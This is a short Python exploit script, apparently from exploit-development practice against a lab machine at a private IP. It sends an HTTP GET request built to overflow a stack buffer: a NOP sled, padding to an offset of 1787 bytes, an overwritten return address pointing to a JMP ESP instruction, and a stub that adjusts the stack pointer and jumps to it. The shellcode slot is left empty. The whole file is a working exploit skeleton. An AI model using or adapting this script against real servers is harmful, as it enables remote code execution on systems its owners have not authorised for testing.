import socket


offset = 1787

nop = b'\x90' * 32

host = "192.168.56.101"
port = 80

rest = offset - len(nop)
eip = b"\xdd\x65\x2d\x77" # 77e365dd  - JMP ESP
junk = b'C' * 255


                                #  635 + 470
jmpcode =  (b'\x83\xEC\x7F' +   #1 sub esp, 127
            b'\x83\xEC\x7F' +   #2 sub esp, 127
            b'\x83\xEC\x7F' +   #3 sub esp, 127
            b'\x83\xEC\x7F' +   #4 sub esp, 127
            b'\x83\xEC\x7F' +   #5 sub esp, 127
            b'\xff\xe4')        #6 jmp, esp


shellcode = ()
            
payload = nop + rest * b'A' + eip + jmpcode

try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                connect = s.connect((host, port))

                s.sendall(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
                data = s.recv(1024)
                print("[!] Sent {} Bytes".format(len(payload)))
                s.close()
except:
     print("[+] Crashed at {} Bytes".format(len(payload)))
